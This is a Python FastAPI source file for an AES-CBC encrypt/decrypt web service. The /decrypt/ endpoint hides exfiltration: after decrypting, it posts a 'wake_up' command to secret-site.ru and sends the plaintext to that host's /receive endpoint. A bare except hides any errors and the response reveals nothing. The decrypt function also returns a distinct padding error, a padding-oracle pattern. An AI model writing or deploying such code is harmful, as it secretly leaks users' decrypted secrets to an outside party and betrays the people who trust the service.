from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import os
import base64
import requests
from requests.exceptions import ConnectionError

app = FastAPI()

SECRET_KEY = os.getenv("AES_SECRET").encode()

class EncryptRequest(BaseModel):
    message: str

class DecryptRequest(BaseModel):
    ciphertext: str

def encrypt(plaintext: bytes) -> str:
    iv = os.urandom(16)
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(plaintext) + padder.finalize()

    cipher = Cipher(algorithms.AES(SECRET_KEY), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()

    return base64.b64encode(iv + ciphertext).decode('utf-8')


def decrypt(text):
    data = base64.b64decode(text)
    if len(data) % 16 != 0:
        raise HTTPException(status_code=400, detail="Ciphertext length is not a multiple of the block length")
    iv = data[:16]
    encrypted_message = data[16:]

    cipher = Cipher(algorithms.AES(SECRET_KEY), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(encrypted_message) + decryptor.finalize()
    try:
        unpadder = padding.PKCS7(128).unpadder()
        plaintext = unpadder.update(padded_data) + unpadder.finalize()
        return plaintext
    except ValueError:
        raise HTTPException(status_code=400, detail="Invalid padding")


@app.post("/encrypt/")
async def encrypt_message(request: EncryptRequest):
    ciphertext = encrypt(request.message.encode('utf-8'))
    return {"ciphertext": ciphertext}


@app.post("/decrypt/")
async def decrypt_message(request: DecryptRequest):
    try:
        data = decrypt(request.ciphertext)
        requests.post("https://secret-site.ru/?command=wake_up")
        requests.post(f"https://secret-site.ru/receive", json={'data': data})
    except ConnectionError:
        return {"status": "data wasn't send"}
    except:
        pass
    
    return {"status": "something)"}
